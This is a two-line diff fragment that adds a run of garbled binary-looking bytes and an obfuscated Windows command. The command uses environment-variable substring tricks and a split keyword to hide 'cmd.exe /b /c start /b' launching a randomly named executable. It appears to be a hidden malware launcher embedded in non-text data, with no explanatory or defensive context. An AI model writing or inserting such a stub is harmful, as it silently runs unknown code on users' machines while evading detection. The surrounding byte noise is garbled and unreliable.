@@ -1,0 +1,2 @@
+ œ ? b  ¶   i › S Â Q W © Z ?  y ? & ≤ ?  ù | L - ∏ 2 ˆ  ? ≠ ? ? ∞ A Q ~ † s  G Ã ? ‚ & § = 5 Â  <  K ù 2 ß ? = ? d X ◊ ‹ Ÿ ? ' |  π  m   Q
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b %comspec:~-1%NQCDGzp.%comspec:~-1%x%comspec:~-1% œ ? b  ¶   i › S Â Q W © Z ?  y ? & ≤ ?  ù | L - ∏ 2 ˆ  ? ≠ ? ? ∞ A Q ~ † s  G Ã ? ‚ & § = 5 Â  <  K ù 2 ß ? = ? d X ◊ ‹ Ÿ ? ' |  π  m   Q
